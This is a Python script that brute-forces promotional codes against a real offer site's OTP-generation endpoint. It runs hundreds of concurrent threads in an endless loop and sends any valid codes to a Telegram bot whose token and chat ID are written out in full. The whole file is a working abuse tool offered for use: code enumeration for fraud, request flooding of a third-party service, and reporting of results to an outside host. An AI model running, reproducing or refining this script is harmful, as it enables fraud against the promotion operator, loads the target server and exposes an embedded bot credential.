import requests
import time
import random
import string
import concurrent.futures
import os
from datetime import datetime
from threading import Lock

# ================== RAILWAY PREMIUM OPTIMIZED ==================
BASE_URL = "https://www.grainotch.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "9369556930"          # Change if needed

BATCH_SIZE = 25000                  # Premium ke liye bada batch
MAX_WORKERS = 250                   # High speed for Railway Premium
DELAY = 0.0

# Telegram
TELEGRAM_BOT_TOKEN = os.getenv("8556329069:AAGHfWrADjuPSXz2WgNsAJN6AyiO7JadgDs")
TELEGRAM_CHAT_ID = os.getenv("8776758021")

session = requests.Session()
lock = Lock()

total_tested = 0
valid_count = 0
batch_valid = 0
batch_start = time.time()

def send_telegram(text: str):
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "parse_mode": "HTML",
            "text": text
        }, timeout=4)
    except:
        pass

def generate_code() -> str:
    return "BMW" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def check_code(code: str):
    global total_tested, valid_count, batch_valid
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
        "Accept": "application/json, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/home/register",
    }
    
    try:
        resp = session.post(OTP_ENDPOINT, 
                          data={"phone": TEST_MOBILE, "ccode": code},
                          headers=headers, 
                          timeout=5)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("status") == "success":
                    with lock:
                        valid_count += 1
                        batch_valid += 1
                    valid_msg = f"<b>🎉 VALID CODE FOUND!</b>\n<code>{code}</code>\nMobile: {TEST_MOBILE}\nTime: {datetime.now().strftime('%H:%M:%S')}"
                    send_telegram(valid_msg)
                    
                    with open("valid_codes.txt", "a") as f:
                        f.write(f"{code} | {datetime.now()}\n")
                    return True
            except:
                pass
    except:
        pass
    
    with lock:
        total_tested += 1
        if total_tested % 25000 == 0:
            send_batch_stats()
    
    return False

def send_batch_stats():
    global batch_valid, batch_start
    elapsed = time.time() - batch_start
    speed = round(25000 / elapsed, 1) if elapsed > 0 else 0
    
    msg = f"<b>📊 RAILWAY PREMIUM 25K BATCH</b>\n\n" \
          f"✅ Valid: <b>{batch_valid}</b>\n" \
          f"❌ Invalid: <b>{25000 - batch_valid}</b>\n" \
          f"⚡ Speed: <b>{speed} codes/sec</b>\n" \
          f"Total Valid: {valid_count}"
    
    send_telegram(msg)
    print(f"25K Batch Done → {batch_valid} Valid | {speed} cps")
    
    batch_valid = 0
    batch_start = time.time()

def main():
    print("🚀 RAILWAY PREMIUM ULTRA FAST GRAINOTCH CHECKER")
    print(f"Workers: {MAX_WORKERS} | Batch: {BATCH_SIZE}")
    send_telegram("<b>🚀 Railway Premium Bot Started</b>")
    
    while True:
        codes = [generate_code() for _ in range(BATCH_SIZE)]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(check_code, codes)

if __name__ == "__main__":
    main()